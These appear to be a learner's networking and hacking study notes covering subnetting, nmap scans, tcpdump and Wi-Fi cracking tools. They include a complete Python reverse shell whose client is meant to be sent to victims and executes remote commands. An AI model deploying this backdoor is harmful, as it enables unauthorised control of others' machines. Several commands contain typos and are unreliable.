+PaaS -> Screenshot(448)
+Security for PaaS -> Screenshot(449)
+
+IaaS -> Screenshot(450)
+IaaS offers -> Screenshot(451)
+Security for IaaS -> Screenshot(452, 453)
+
+Pizza as a Service -> Screenshot(454)
+
+Cloud Computing Standards Roadmap Part 1 -> Screenshot(456, 457)
+
+Interoperablity -> Screenshot(458)
+Portability -> Screenshot(459)
+Availability -> Screenshot(460)
+Security -> Screenshot(461)
+Privacy -> Screenshot(462)
+Resilience -> Screenshot(463)
+Performance -> Screenshot(464)
+Governance -> Screenshot(465)
+
+IS.zoom4@ll
+
+using rpm -> Screenshot(486)
+
+--------------------------------------------------------------------------------------------------------------------
+
+- Backup in linux -> https://www.youtube.com/watch?v=eQA51w69MNQ
+
+- All Kali linux cmds -> https://techlog360.com/a-z-kali-linux-commands/
+
+- After installing kali video youtube channel ceos3c tutorials
+
+
+ls 
+-l 
+-a
+-R  hierachial
+-s
+-d
+
+ 
+-------------------------------------------------------------------------------------------------------------------------
+Python Networking ->
+
+@ -> https://www.youtube.com/watch?v=E3YcCawV-0s&index=16&list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF
+
+Public IP address r provided by the ISP's or Wi-Fi Ex - on google type -> whats my ip // to know ur public IP address
+Private IP address r provided by the router, Ex -> on terminal type ifconfig or ipconfig // to know ur private IP address
+
+Static IP address do not change while the Dynamic IP address always keep changing
+Static IP Ex -> Servers and Websites    // this IP will not change unless u r accessing from same place bcz such as if u shift from
+ US to India then u will be interacting with different server of the same website
+Dynamic IP Ex -> Computer and Mobile Devices
+
+windows terminal -> netstat -a -b -n // only with administrator privileges on entering the following cmd u get the list of all IP addresses with
+                                        ports
+We can understand it like this way as IP address as street and port no. as house on the street
+
+Some Protocols have definate Port No.
+HTTP    - 80
+FTP     - 20
+SMTP    - 25
+NNTP    - 119
+POP3    - 110
+
+List of Well Known TCP port No. -> https://www.webopedia.com/quick_ref/portnumbers.asp
+
+U can enter the port no. with protocols Ex -> on browser type 'google.com:80' in URL u will see that the google is open but if u type in the
+browser 'google.com:20' u will get the error msg as port no. 20 is for FTP
+
+Sockets r required for one computer to another computer by binding the port and IP address together
+Socket cmds in python ->
+socket.socket()             // this creates a socket
+s.bind(host,port)           // to bind the ip and port to the socket , IP is also known as host
+s.send()                    // to send a msg
+s.listen()                  // to listen a msg
+s.recv()                    // after receiving msg decode the msg into its system
+s.close()                   // close the socket
+
+Direct Connections -> remotely connect to computer using cmd shell or terminal , for this u first create a socket on ur own computer and then
+send a request to another computer IP address
+
+Problems with Direct Connection ->
+- It is difficult to get the IP of another computer
+- Even If we get the IP address, the IP will we dynamic IP so its always changing
+- Even if we get regular updates of Dynamic IP still the computer has bunch of firewalls which prevents these type of connections to happen,
+  which makes impossible for us to get into another computer
+
+Reverse Connections -> In this the connection is initiated from the victim's computer, So in this the hackers create a python file called
+reverse shell in which the hackers IP and Port is stored and then send this file to victim, and when victim opens this file it creates a reverse
+connection to the hackers computer
+So now the hacker doesn't have to worry about the IP of the victim's computer
+But still their is one problem the hackers computer still has a Dynamic IP, so the address stored in the file will we use less after some time,
+to solve this problem hackers create a server and store the IP address of server in reverse shell file bcz servers have static IP
+
+Server is just a remote computer that never gets turned off
+
+Create a server instance using the ec2 of aws or another such as DigitalOcean
+
+Here we r going to build two files server.py and client.py, the server.py will be installed on the cloud server and client.py will be installed
+on the victim's computer
+
+Data is send from one computer to another computer in the formats of bytes so our cmds to go to the victim computer should be encoded in the
+byte format
+
+On the server side and client side the flow is like this
+server side
+socket() -> bind() -> listen() -> accept() -> block until there r  connection from client ->  read() -> process request -> write() -> close()
+                                                               ^                                ^                             | Data(reply)
+client side                                                    |connection established          |Data(request)                v
+socket()            --------------->                        connect()       -------------->   write() -------------------->  read() --> close
+
+server.py file ->
+import socket
+import sys  # this is used to implement cmd line and terminal cmds into python file
+
+# Creating Socket
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+        host = ""
+        port = 9999     # this port no. is used bcz this is not used a lot
+        s = socket.socket()
+
+    except socket.error as msg:             # if their is any error it will be in socket.error and then we save it in msg
+        print('Socket creation error ' + str(msg))
+
+# Binding Socket and listing Connections
+def bind_socket():
+    try:
+        global host             # we r declaring them again bcz if we want to access the global value of another function such as here
+        global port             # create_socket() global variables we need to declare them again
+        global s
+
+        print("Binding the Port " + str(port))
+
+        s.bind((host,port))         # for the binding
+        s.listen(5)                 # to listen for connections from our client and 5 is here limit for the no. of connections it is going to tolerate before throwing an error
+
+    except socket.error as msg:
+        print('Socket Binding error ' + str(msg) + "\n" + "Retrying...")
+        bind_socket()       # we r using the recursion here so that if their is any error it will try again and again for the connection
+
+# Establish connection with client and socket must be listening
+def socket_accept():
+    conn,address = s.accept()      # accept() returns two data, object of the connection and list of IP address and Port
+    print("Connection has been established ! " + " IP " + address[0] + "| Port " + str(address[1]))
+    send_command(conn)      # this is to send commands to the connection
+    conn.close()    # to close the connection
+
+# Send Commands to Victim
+def send_command(conn):
+    while True:                  # we r going to use infinity loop bcz if we r sending a cmd to victim but we have used the conn.close() after the calling send_command
+        cmd = input()            # function from the socket_accept(), so we need some persitance for more cmds to enter
+        if cmd == 'quit':
+            conn.close()            # close the connection
+            s.close()               # close the socket
+            sys.exit()              # to close cmd prmt of victim computer
+        if len(str.encode(cmd)) > 0:        # this is to check if user has typed something
+            conn.send(str.encode(cmd))      # to send the cmd
+            client_response = str(conn.recv(1024),"utf-8")  # to get the response of the cmd and here we r also converting the data from byte format to string format so 1024 is the chunk size of data and "utf-8" is to convert the data to string format
+            print(client_response, end="")                  # end="" is to send the cursor to next line for new cmd
+
+
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+
+main()
+
+--------------------------------------------
+
+client.py file ->
+
+import socket
+import os
+import subprocess
+
+s= socket.socket()
+host = '10.11.28.137'           # IP of attacker
+port = 9999
+
+s.connect((host,port))
+
+while True:
+    data = s.recv(1024)        # for the navigation cmds such as 'cd' which does not return any output just execute we need
+    if data[:2].decode("utf-8") == 'cd':        # we r taking first two characters of data and decode it
+        os.chdir(data[3:].decode("utf-8"))      # this line will contain the path to which we need to navigate
+
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)    # this will open the terminal and execute the cmd and shell is fro the access to shell cmds and stdout is for output stream
+        output_byte = cmd.stdout.read() + cmd.stderr.read()             # this is if we need to show our input cmds to the victim also
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "            # to know the current working directory and send it to the server
+        s.send(str.encode(output_str + currentWD))      # send out back to server
+
+        print(output_str)   # this for client's computer
+
+
+For the local testing ->
+First Run server.py file on system itself
+and run the client.py in another termainl   // and u will get the connection established msg
+and then execute cmds
+
+For connecting to multiple clients ->
+We get two things in return from client connection object and address, So here we r going to make a list of the connection objects and address
+for multiple clients, So here r two tasks to do
+- Listen and accept connections from others
+- Sending commands to an already connected
+
+For above mentioned tasks we need to use Threads specifically two threads here one for each task
+
+----------------------------------------------------------------------------------------------------------------
+IP address has 4 octets and each octet has 8 bits
+
+2**m // m is the no. of bits
+
+the last bit at position 0 in the octet is known as Least Significant Bit and the First bit at position 7 is known as the Most
+Significant Bit
+So on the basis of that at position 0 the decimal value would be 2**0 = 1 and at position 7 the decimal will be 2**7 = 128
+Hence -> x  x  x  x  x  x  x  x // x could be 0 or 1
+        128 64 32 16 8  4  2  1 // Decimal value of bits by 2**m formula
+
+Now these above calculated decimal values for each position in octet will be count only when a bit is set to 1 bcz when a bit is
+set to 0 it will always have the decimal value of 0
+
+ Ex ->  1   0   1   0   1   1   1   1 // 8 bits data
+       128  0   32  0   8   4   2   1 // Decimal values
+
+Now the decimal no. which corresponds to those 8 bits -> 128 + 0 + 32 + 0 + 8 + 4+ 2+ 1 = 175
+
+       IP address -> Host(device) Identifier + Network(Subnet) to which a given host belongs to
+
+Network mask is used to identify the Network Portion of an IP address, network mask is a 32 bit long continous number of 1's
+followed by 0's network mask can be also represented in a dotted decimal format like 255.255.255.0 or /24 so here the Network Id
+is represented by the address bit's set to 1 and host identifier is represented by 0 from a Network mask
+Host ID with a numerically highest no. makes a broadcast address
+Network and broadcast IP addresses r reserved and cannot be allocated for nodes
+ EX -> an IP address sent with network mask
+ IP address ->  192.168.255.2
+ Netwrok mask ->255.255.255.0
+
+ IP address in Binary ->    11000000 10101000 11111111 00000010
+ Netwrok mask in Binary->   11111111 11111111 11111111 00000000   // here all 1's r for the network and all 0's is for the host
+                                                             // so this means that the network address then would be 192.168.255
+                                                             // in the IP address and 2 will be the Host portion and this Host
+                                                             // portion r the bits which we can allocate for the addresses of
+                                                             // our devices
+ End Result using the AND-> 11000000 10101000 11111111 00000000
+
+On converting result 11000000 10101000 11111111 00000000 to decimal -> 192.168.255.0
+the actual identifier of the above network is -> 192.168.255.0 // this is network identifier
+
+Actual Range of Host addresses from above output that we can allocate to hosts from this network is ->
+192.168.255.1 to 192.168.255.254
+and the network identifier 192.168.255.0 could also be said as the lowest host IP and the highest is 192.168.255.255 and this is
+known as broadcast address
+
+ Ex 2 ->
+ IP address ->  10.15.4.2
+ Network mask ->255.0.0.0
+
+ IP address in Binary ->    00001010 00001111 00000100 00000010
+ Network mask in Binary->   11111111 00000000 00000000 00000000
+ End Result using the AND-> 00001010 00000000 00000000 00000000
+
+On converting result 00001010 00000000 00000000 00000000 to decimal -> 10.0.0.0
+the actual identifier of the above network is -> 10.0.0.0 // this is network identifier
+
+Actual Range of Host addresses from above output that we can allocate to hosts from this network is -> 10.0.0.1 to 10.255.255.254
+
+Classfull Network Architecture ->
+First 3 classes A,B,C have designating network mask or we can say network masks were encoded in the 1st 3 bit's of an IP address
+    - class A addresses are IP addresses start with binary 0 as 0xx and assume a network mask of 255.0.0.0(/8)
+    - class B addresses are IP addresses start with binary 10 as 10x and assume a network mask of 255.255.0.0(/16)
+    - class C addresses are IP addresses start with binary 110 as 0xx and assume a network mask of 255.255.255.0(/24)
+    - Other two classes D and E don't use the network masks
+
+Unicast -> Class A,B,C , It identifies the single NIC of a device
+Broadcast -> It identifies all NIC in a given Network
+
+Network address and Broadcast address can never be allocated to ur devices NIC
+
+Originally all Unicast IPv4 addresses were Public
+    - A Public IP address uniquely identifies a host on the internet
+        - Belongs to one device/organization
+
+RFC 1918 reserves three ranges of Unicast IPv4 addresses for Private Use
+    - Single Class A network ranges 10.0.0.0(10.0.0.0 - 10.255.255.255)
+    - 16 class B network ranges 172.16.0.0 - 172.31.0.0 (172.16.0.0 - 172.31.255.255)
+    - 256 class C network ranges 192.168.0.0 - 192.168.255.0 (192.168.0.0 - 192.168.255.255)
+
+Private IP ranges cannot be used to connect to the Internet(unless with NAT)
+
+CIDR reduces the waste of IPv4 addresses by getting rid of Network classes and allowing to assign an arbitrary(power of 2)
+block of IP addresses
+Ex -> 17.10.20.0/24
+
+Subnetting is a process of subdividing a classfull network or CIDR block into smaller network, known as subnets, Same as network
+mask defines the network portion of an IP address, subnet mask defines the Subnet portion
+
+Address bits that have corresponding mask bits set to 1 represent the Subnet part -> To calculate the Subnet ID set all
+remaining bits to 0
+
+Any addresses within within the subnet range represent HostIDs , The highest address in the Subnet is known as Broadcast
+Subnet and Broadcast IP addresses r reserved and cannot be allocated
+
+Ex 1 -> IP -> 11.0.0.7
+Subnet Mask -> 255.192.0.0
+
+IP address in Binary ->  00001011 00000000 00000000 00000111
+Subnet mask in Binary -> 11111111 11000000 00000000 00000000
+Subnet Part           -> 00001011 00
+Host Part             ->            000000 00000000 00000111
+Subnet ID             -> 00001011 00000000 00000000 00000000  (11.0.0.0)// bits which r under the host part will convert to 0
+Host IDs              -> 00001011 00XXXXXX XXXXXXXX XXXXXXXX  (11.0.0.1 - 11.63.255.254)
+                                    111111 11111111 11111111  // replacing X with 1 we get 11.63.255.255
+
+
+ Ex 2 -> IP -> 11.67.6.4
+Subnet Mask -> 255.192.0.0
+
+IP address in Binary ->    00001011 01000011 00000110 00000100
+Subnet mask in Binary ->   11111111 11000000 00000000 00000000
+Subnet Part           ->   00001011 00
+Host Part             ->              000011 00000110 00000100
+Subnet ID             ->   00001011 01000000 00000000 00000000  (11.64.0.0)// bits which r under the host part will convert to 0
+Host IDs              ->   00001011 01XXXXXX XXXXXXXX XXXXXXXX  (11.64.0.1 - 11.127.255.254)
+                                      111111 11111111 11111111  // replacing X with 1 we get 11.63.255.255
+
+----------------------------------------------------------------------------------------------------------------
+
+Wireless ->
+Jamming the access point is kind of DoS attack
+
+Evil Twin or Rogue Accesspoint -> Is a fake access point that U can create and then allow the victims or right access
+points or force them to connect to ur own fake access point
+
+Wireless router or access point to which the clients got connected,Screenshot(127)
+
+Monitor mode and injection mode wireless adapters r needed to do wireless attacks, most common one which r wireless cards
+r working in managed mode.
+
+Unlicensed Frequency Bands -> Screenshot(128), These frequency bands r for common people usage others the Licensed ones
+r used by goverment.
+
+WI-FI Standards -> Screenshot(129) -@@
+
+Cisco packet tracer can be used to build wireless networks also.
+
+Wireless Encryption Keys -> WEP, WPA (Personal), WPA (Enterprise), WPA2 (Personal), WPA2 (Enterprise)
+Personal settings for the encryption only asks for the key to be used as password but on enterprise the key and RADIUS IP both
+r asked, RADIUS is a software, this software allow u to create username and password. So suppose u created multiple username
+and passwords in the RADIUS program on computer then , now go to the router and enter the IP of the computer with this radius
+software and synchronize the computer with the wireless accesspoint , now anyone who need to connect to the wireless point also
+need to have a user account in the radius software computer.
+
+WEP protocol -> RC4, this is weak protocol can be break very easily.
+WPA also uses the same RC4 protocol but with bigger key.
+WPA2 uses AES prtotocol.
+
+SSID broadcast is by deafult enabled, so the previous connected devices would be working fine but the new devices won't be
+able to see the device to connect this is called hide SSID.
+
+Remember the computer is not scanning for the network near it, instead the other computers r broadcasting themselves allover.
+ 
+Tools used for wireless attacks -> 
+-airmon-ng // this will switch or change the mode of our access point to monitor mode
+- airodump-ng // this will give u information about all the wireless inside the range such as name, devices connected to them
+, what kind of encryption they have, MAC address of devices
+- aireplay-ng // this sends de-authentication packet, which could be used to disconnect the device from the wireless networks
+- aircrack // this is used for cracking the passwords
+
+- Every router or access point has beaking which is sending signal randomly kind of saying I am UP and my name is XYZ, this
+is called beaking or broadcasting.
+
+WIFI Broadcast -> Screenshot(131)
+
+- We can use Cain also for wireless key cracking, we need a special packet called IV packet to get the key
+
+- This will try to get connected to access point using the fake authentcation packet, and then access point will
+ generate this IV packet hence take less time for task as the cain tool is not able to do this.
+ 
+ -------------------------------------------------------------------------------------------------------------------------
+ 
+ - URL Anatomy -> Screenshot(1)
+
+IP address of router generally is like this 192.168.0.1 starting with 192 and the IP address for the computer then connected
+to this router would be 192.168.0.19
+
+- Try 127.0.0.1 in the browser to see what server technology it shows?
+
+- Now if u try to put the IP such as 192.168.0.3 it will try to find a compputer on ur own network that has this address not on
+the internet 
+
+- tcpdump -> It's a powerfull cmdline packet sniffer, to analyse the packets that r going in and out of ur network 
+
+- sudo apt-get install tcpdump // to install tcpdump
+- sudo tcpdump // to execute program tcpdump, this will run untill u cancel and during that time it will show all the packets
+which r coming in and out of the network
+- sudo tcpdump -c 10 // this will now only capture 10 packets
+in the output the 1st column is timestamp then it show out IP address, then the IP of router to which our computer is sending
+out packets and the domain to which the packet ends up to. 
+- sudo tcpdump -c 10 -A // this will print the actual packets in ASCII
+- sudo tcpdump -c 5 -i wlo1 // this will now listen to a specific interface here it is wl01
+- sudo tcpdump -xx -i wlo1 // this will print out the packets in hex and ASCII format 
+- sudo tcpdump -i wlo1 port 22 // to capture packets from specific ports to run this properly connect to some server by the cmd
+  ssh user_name_of_remote_server@ip_address_of_Server on another terminal(2nd) and each time u do something on 2nd terminal u
+  will see the changes in terminal 1
+-
+- host file is present in /etc/hosts 
+- cmd -> sudo nano /etc/hosts  // think of the file opened as an internal DNS lookup functionality, So when u go to app.localhost
+  // the first place the computer checks for routes is this hosts file and if doesn't find an entry for a domain in the host file
+  // then it goes to the router and the to DNS server, So by adding entries here we can actually overwrite the default behaviour
+  // of known domains that we wants to change 
+- edit file by entering as in the 1st column the IP, in 2nd host name, in 3rd enter alias
+Ex-> 216.58.218.142      go.com      go //edit like this in /etc/hosts file and then in the browser enter 'go', this way u can  
+create shoutcuts for ur favourite websites, but this works better for simple websites with the websites such as google which
+have lots of internal routing going on it not works generally.  
+- Go to network-tools.com and then type google.com to know it's IP, this IP is also usefull with tcpdump so that we can analyse
+the packets and see that from were the packets r coming into our network 
+  
+- sudo hostnamectl set-hostname name_for_host // To change hostname then edit hosts file by cmd-> sudo nano /etc/hosts and
+then change the hostname their as replace the old name with new name then cmd -> sudo service hostname restart
+- hostname // to check hostname 
+- in the browser enter http://hostname // to go to localhost page
+
+- nmap is a open source network scanner, it is used to discover hosts or services on network by sending packets and analysing the
+responses, most beginners only use nmap to scan a network for open ports but u can use it to discover host services, OS and even
+use its extensible scripting library for vulnerability scanning 
+
+- sudo apt-get update && sudo apt-get install nmap  // to install nmap 
+- nmap -sP 192.168.50.0/24 // this is to scan a subnet here we r scanning from 192.168.50.0 to 192.168.50.254, by this we r now
+looking for hosts that r up and ping able    
+- nmap ip_of_machine_to_scan // it will return open ports and it return the services that belong to the open ports
+- nmap ip_of_machine_1_to_scan ip_of_machine_2_to_scan // to do multiple scanning
+- nmap 192.168.50.1-200  // to scan whole IP address range
+- We can also provide the lists of mulitple IPs in a file and use it with nmap Steps->
+	- touch targets.txt
+	- echo 192.168.50.1-100 > targets.txt
+	- cat targets.txt
+	- nmap -iL targets.txt // to execute the lists file
+- We can also exclude targets from scan such as if u don't want to scan router 
+	- nmap 192.168.50.0/24 --e0xclude 192.168.50.6 // now out of whole subnet scan the IP 192.168.50.6 is excluded 
+- We can also exclude a whole range of IP addresses by ->
+	- nmap 192.168.50.0/24 --exclude 192.168.50.150-200 // now out of whole subnet scan the IPs between 192.168.50.150 and
+	  192.168.50.200 are excluded
+- This is aggressive scan be carefull with this as it more easily detectable then the previous scans, this uses a variety of scan
+options which r included in a single param -A, this scan take a little longer but it give lot more information then previous scans
+cmd -> nmap 192.168.50.4 -A 
+
+- When u start working on a new network the 1st things u wants to do is to reduce the list of devices or IPs in the network into a
+list that only contains devices that r interesting for further investigation 
+- listscan lists each host of the network without sending any packets to the hosts themselves, it can sometimes does not work such
+as if u scan 10 ip addresses and zero hosts r found	but it can also mean that it was simply blocked by the machine 
+cmd -> nmap -sL 192.168.56.100-105
+- No port scan, it means that u don't run a port scan after host discovery is done it only prints out the available hosts that 
+responded to the discovery probs, u can also call it a ping scan basically 
+cmd -> nmap -sn 192.168.50.8 // it basically only report that the host is either up or down, u can also run it against the larger
+no. of IP addresses at the same time, it is good for some live reconissance
+- The no ping scan skips the complete Nmap discovery process. Nmap directly starts to run to run it's default port scans (1000 most 
+used) if it finds the target IP is up.
+cmd -> nmap -Pn 192.168.56.8	// it will show how many ports r closed and open on the machine
+cmd -> 192.168.56.100-105
+- The TCP SYN scan, this scanning option sends a empty TCP packet with SYN flag attach to it, the default support 80, the SYN flag
+tells the remote system that u r attempting to connect to it basically, if the port is open then the target will start the 2nd step
+of 3way handshake by responding with a SYN/ACK tcp packet, This is usefull for systems which block the ICMP requests, u can also
+change the default port to the port want
+cmd -> nmap -PS 192.168.56.8	// this is for default port 80
+cmd -> nmap -PS22 192.168.56.8	// thi is for port 22
+
+- TCP ACK ping this is usefull for networks that blocks the ICMP and the SYN scan both, It discovers the host by responding to
+non-existing TCP connections to provoke a response from the target, On finding the target up and running then it runs a default
+port scan against it
+cmd -> nmap -PA 192.168.56.8 // this might only work bcz we don't have firewall running behind or infront of the clients otherwise
+it will not work
+
+- UDP ping scan sends the UDP packets to get a response from the target. Most networks,firewalls that block UDP requests by default
+or if they r not properly configured, if u r not logged in as root then u might need to use the sudo prefix
+cmd -> sudo nmap -PU 192.168.56.8	// this will also return the MAC of the virtual NIC and the open ports on the target
+
+- SCTP(Stream Control Trnasmission Protocol) init ping scan, it is used to discover VOIP services such as voice over IP, IP telephonig
+cmd -> sudo nmap -PY 192.168.56.8 // this is usefull bcz people do not update their devicecs and hence they r more vulnerable
+cmd -> sudo nmap22,80 -PY 192.168.56.8 // this is to use different ports at the same time
+
+- ICMP echo ping 
+cmd -> sudo nmap -PE 192.168.56.8 // this is same as ping, if u don't put sudo then it will run the TCP scan rather then ICMP
+
+- ICMP timestamp ping, most systems r configured to block the ICMP but it is also possible that they could still allow for the ICMP
+timestamp ping
+cmd -> sudo nmap -PP 192.168.56.8
+
+- ICMP address mask ping this also used an alternative for the firewall which is blocking ICMP requests
+cmd -> sudo nmap -PM 192.168.56.8
+
+- IP protocol ping, it allow u to send packets with specified protocols to the target, if u don't specify any specific protocol
+the default protocols r ICMP, IGMP and IP 
+cmd -> sudo nmap -PO 192.168.56.8	//this will show the protocols no. from 0 till to 255,this is default cmd
+cmd -> sudo nmap -P01,5 192.168.56.8 // spicifiying the protocol no.'sL
+
+- ARP ping, this is the fastest way of discoving host on the network, the ARP requests can't be blocked by host on a network, no
+matter if their is firewall involved or not, but ur attacker machine has to be in the local network for this to work
+cmd -> sudo nmap -PR 192.168.56.8
+
+- traceroute ->
+cmd -> sudo nmap --traceroute 192.168.56.8	
+
+- For Reverse DNS for Resolution, normally DNS will only do the reverse DNS lookups for hosts that r online, With the -R tag, you
+ can enforce this and Nmap will try to resolve DNS names of all the specified IP addresses. Be aware tho, the -R option will
+ decrease your scan performance tremendously making ur scan take longer.
+cmd -> sudo nmap -R 192.168.56.8 
+
+- Disable Reverse DNS Resolution -> As mentioned in the previous Force Reverse DNS Resolution command, per default DNS resolution
+ is only used against hosts that appear online. You can disable DNS resolution altogether if you do not need it. This will increase
+ your scan performance and decrease your scan time tremendously.
+ cmd -> nmap -n 192.168.56.8
+ 
+- Alternative DNS Lookup Method -> While not very often used in the field, this option allows you to tell Nmap to use the host
+ systems DNS server for the DNS lookup. This scan slows down your scan time even more than the normal Reverse DNS Lookup. Just
+ recognize the command exists.
+cmd -> nmap --system-dns 192.168.56.103
+
+- Manually Specify DNS Servers -> The last option we look at is used to manually specify a DNS server for your Nmap scan. This could
+ be used if you want to avoid that your DNS request appears in the local DNS server.
+cmd -> nmap --dns-servers YourDnsServerAddress 192.168.56.10
+
+Advanced nmap commands ->
+- https://www.ceos3c.com/hacking/nmap-tutorial-series-3-advanced-nmap-commands/
+
+Nmap Scripts (NSE) ->
+- https://www.ceos3c.com/hacking/nmap-tutorial-series-4-nmap-scripts-nse/
+
+SSH to Access the commandline of a Remote Host ->
+- SSH(Secure Shell) it allows to access and control the cmd line of the remote host that has a SSH server setup
+cmd -> ssh username@remote_host_name
+use cmd -> exit // to close the connection
+
+Transfr Files Between 2 computers using SFTP->
+SFTP (Secure File Transfer Protocol) , FTP port 21, transfers file in clear text.
+cmd -> sftp username@remote_host_name
+> ls // for the listing on remote host 
+> lls // for the listing on the local host
+> put filename	// to upload the file from the local host to the remote host
+> get filename  // to download the file from the remote host to the local host
+
+Setup an SSH host on ur local machine ->
+cmd on attacker machine -> sudo apt-get install openssh-server
+cmd on attacker machine -> sudo nano /etc/ssh/ssh_config	// edit the PORT from 22 to 2212 and change the "PermitRootLogin" to 'no'
+and also add the line at the end of the file as -> AllowUsers username	// this is going to restrict all other users to login via ssh
+now u save the file with changes
+cmd on attacker machine -> sudo systemctrl restart ssh // to restart the service
+cmd on attacker machine -> ssh username@remote_host
+ > ssh attacker_username@attacker_machine_host 
+
+--------------------------------------------------------------------------------------------------------------------------
+
+
+  
